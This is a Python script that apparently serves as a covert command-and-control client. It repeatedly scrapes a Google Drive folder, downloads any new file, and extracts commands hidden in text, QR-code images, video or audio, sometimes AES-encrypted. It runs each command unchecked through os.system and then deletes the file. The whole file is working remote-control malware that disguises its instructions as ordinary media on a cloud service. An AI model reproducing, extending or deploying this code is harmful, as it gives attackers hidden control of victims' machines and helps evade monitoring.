from __future__ import unicode_literals
from bs4 import BeautifulSoup
import read_file
import requests
import datetime
import urllib
import config
import time
import sys
import os

debug = config.debug

def execute_commands(commands):
	cmd_counter = 0
	for cmd_ in commands:
		cmd_counter += 1
		now = datetime.datetime.now()
		if debug: print("[%02d:%02d:%02d] Command %s: %s"%(now.hour,now.minute,now.second,str(cmd_counter),cmd_))
		os.system(cmd_)


def analyze(downloaded_file):
	data_type = config.data_type
	if data_type == "text" or data_type == "text_encrypted":
		if not downloaded_file.endswith(".txt"):
			now = datetime.datetime.now()
			if debug: print("[%02d:%02d:%02d] Incorrect extension. Expected: %s"%(now.hour,now.minute,now.second,".txt"))
		else:
			commands = read_file.read_text(data_type, downloaded_file)
	elif data_type == "image" or data_type == "image_encrypted":
		if not downloaded_file.endswith(".png"):
			now = datetime.datetime.now()
			if debug: print("[%02d:%02d:%02d] Incorrect extension. Expected: %s"%(now.hour,now.minute,now.second,".png"))
		else:
			if data_type == "image":
				commands = read_file.read_image("qr", downloaded_file)
			elif data_type == "image_encrypted":
				commands = read_file.read_image("qr_aes", downloaded_file)
	elif data_type == "video" or data_type == "video_encrypted":
		if not downloaded_file.endswith(".avi"):
			now = datetime.datetime.now()
			if debug: print("[%02d:%02d:%02d] Incorrect extension. Expected: %s"%(now.hour,now.minute,now.second,".avi"))
		else:
			if data_type == "video":
				commands = read_file.read_video("qr", downloaded_file, "/tmp/")
			elif data_type == "video_encrypted":
				commands = read_file.read_video("qr_aes", downloaded_file, "/tmp/")
	elif data_type == "audio" or data_type == "audio_encrypted":
		if not downloaded_file.endswith(".wav"):
			now = datetime.datetime.now()
			if debug: print("[%02d:%02d:%02d] Incorrect extension. Expected: %s"%(now.hour,now.minute,now.second,".wav"))
		else:
			commands = read_file.read_audio(data_type, downloaded_file)
	else:
		if debug: print("[%02d:%02d:%02d] Unexpected data_type value: %s"%(now.hour,now.minute,now.second,data_type))
		commands = []
	return commands


def download_file(file_url, downloaded_file_path):
	now = datetime.datetime.now()
	if debug: print("[%02d:%02d:%02d] New file! Downloading to: %s"%(now.hour,now.minute,now.second,downloaded_file_path))
	with requests.get(file_url, stream=True) as r:
		r.raise_for_status()
		with open(downloaded_file_path, 'wb') as f:
			for chunk in r.iter_content(chunk_size=8192): 
				f.write(chunk)


def get_files(url):
	data = requests.get(url)
	soup = BeautifulSoup(data.text, 'html.parser')
	files_list = []
	counter = 0
	divs = soup.findAll("div")
	for d in divs:
		if d.has_attr('data-id'):
			counter+=1
			fileid = d['data-id']
			filename = d.findAll("div",{"data-tooltip-unhoverable":"true"})[0]['data-tooltip']
			download_url = "https://drive.google.com/uc?id="+fileid+"&authuser=0&export=download"
			files_list.append({"name":filename,"id":fileid,"url":download_url})
	return files_list


def wait_for_upload(delay_seconds, download_dir, url):
	now = datetime.datetime.now()
	if debug: print("[%02d:%02d:%02d] Waiting %s seconds..."%(now.hour,now.minute,now.second,delay_seconds))
	files_initial = get_files(url)
	while True:
		time.sleep(delay_seconds)
		files_now = get_files(url)
		if len(files_now) > len(files_initial):
			new_files = [item for item in files_now if item not in files_initial]
			for file in new_files:
				downloaded_file = download_dir+str(file['name'])
				download_file(str(file['url']), downloaded_file)
				time.sleep(2)
				commands = analyze(download_dir+str(file['name']))
				execute_commands(commands)
				os.remove(downloaded_file)
				files_initial = files_now
		else:
			now = datetime.datetime.now()
			if debug: print("[%02d:%02d:%02d] No new file uploaded. Waiting %s seconds..."%(now.hour,now.minute,now.second,delay_seconds))
		

def main():
	url = config.googledrive_folder
	download_dir = config.temp_folder 
	delay_seconds = config.delay_seconds
	wait_for_upload(delay_seconds, download_dir, url)


if __name__== "__main__":
	main()